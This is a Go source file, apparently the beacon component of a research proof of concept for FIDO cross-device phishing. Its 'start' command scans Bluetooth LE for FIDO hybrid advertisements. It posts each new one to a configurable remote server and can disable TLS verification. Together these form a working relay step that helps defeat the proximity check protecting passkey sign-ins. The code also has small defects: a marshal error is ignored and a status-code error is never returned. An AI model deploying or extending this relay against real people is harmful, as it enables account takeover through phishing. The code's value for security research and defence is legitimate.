package cmd

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"errors"
	"io/ioutil"
	"log/slog"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/denniskniep/fido-cross-device-phishing/beacon/pkg/fido"
	"github.com/spf13/cobra"
	"tinygo.org/x/bluetooth"
)

var (
	server      string
	insecureTls bool
	tlsCaPath   string
	username    string
	password    string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&server, "server-address", "s", "127.0.0.1:4444", "Sending the BLE advertisements to this address ")
	runCmd.Flags().BoolVarP(&insecureTls, "insecure-tls", "i", false, "Allow insecure server connections")
	runCmd.Flags().StringVarP(&tlsCaPath, "tls-ca-path", "c", "crt/ca.crt", "trusted ca pem file path")
	runCmd.Flags().StringVarP(&username, "username", "u", os.Getenv("BEACON_USERNAME"), "Username for Server or use env var BEACON_USERNAME")
	runCmd.Flags().StringVarP(&password, "password", "p", os.Getenv("BEACON_PASSWORD"), "Password for Server or use env var BEACON_PASSWORD")
}

var runCmd = &cobra.Command{
	Use:   "start",
	Short: "Start listening for bluetooth advertisements",
	Run: func(cmd *cobra.Command, args []string) {
		executeStart()
	},
}

var adapter = bluetooth.DefaultAdapter
var advertisements []*fido.FidoAdvertisement
var stopped = false

func executeStart() {
	must("enable BLE stack", adapter.Enable())

	if insecureTls {
		slog.Warn("Insecure TLS is enabled")
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	} else if tlsCaPath != "" {
		ca := x509.NewCertPool()
		certs, err := ioutil.ReadFile(tlsCaPath)
		if err != nil {
			panic("failed to load cert" + tlsCaPath + ": " + err.Error())
		}
		if ok := ca.AppendCertsFromPEM(certs); !ok {
			slog.Warn("No certs appended!")
		}
		slog.Info("For TLS using CA from " + tlsCaPath)
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{RootCAs: ca}
	}

	if username != "" {
		slog.Info("Using credentials for sending advertisements (User: " + username + ")")
	}

	signalChannel := make(chan os.Signal, 2)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT)
	go func() {
		sig := <-signalChannel
		switch sig {
		case os.Interrupt:
			gracefulShutdown()
		case syscall.SIGINT:

			gracefulShutdown()
		}
	}()

	for {
		err := startScanning()
		if err != nil {
			slog.Error("Error during Scanning", err)
			time.Sleep(5 * time.Second)
		}
	}
}

func startScanning() error {
	slog.Info("Start Scanning...")
	err := adapter.Scan(func(adapter *bluetooth.Adapter, device bluetooth.ScanResult) {
		for _, serviceData := range device.ServiceData() {
			if fido.IsFidoAdvertisement(serviceData.UUID.String()) {
				ad, err := fido.NewFidoAdvertisement("Nr.1", device.Address.String(), serviceData.UUID.String(), serviceData.Data)
				if err != nil {
					slog.Error("Error when trying to add FIDO FidoAdvertisement", err)
				} else {
					addFidoAdvertisement(ad)
				}
			}
		}
	})
	return err
}

func addFidoAdvertisement(ad *fido.FidoAdvertisement) {
	new := true
	for _, advertisement := range advertisements {
		if advertisement.IsEqual(ad) {
			new = false
			advertisement.Seen()
			break
		}
	}

	if new {
		advertisements = append(advertisements, ad)
		slog.Info("Seen new FidoAdvertisement: " + ad.String())
		err := sendToServer(ad)
		if err != nil {
			slog.Error("Error when sending FidoAdvertisement to server", err)
		}
	}
}

func must(action string, err error) {
	if err != nil {
		panic("failed to " + action + ": " + err.Error())
	}
}

func gracefulShutdown() {
	stopped = true
	adapter.StopScan()
	slog.Info("Stopped scanning")
	for _, advertisement := range advertisements {
		slog.Info("Seen FidoAdvertisement: " + advertisement.String())
	}
	os.Exit(0)
}

func sendToServer(ad *fido.FidoAdvertisement) error {
	jsonBody, err := json.Marshal(ad)
	bodyReader := bytes.NewReader(jsonBody)
	u, err := url.Parse("https://" + server + "/advertisement")
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, u.String(), bodyReader)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	if username != "" {
		req.SetBasicAuth(username, password)
	}

	client := http.Client{
		Timeout: 30 * time.Second,
	}

	res, err := client.Do(req)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		errors.New("FidoAdvertisements could not be sent to the server! Received StatusCode:" + strconv.Itoa(res.StatusCode))
	}
	return nil
}
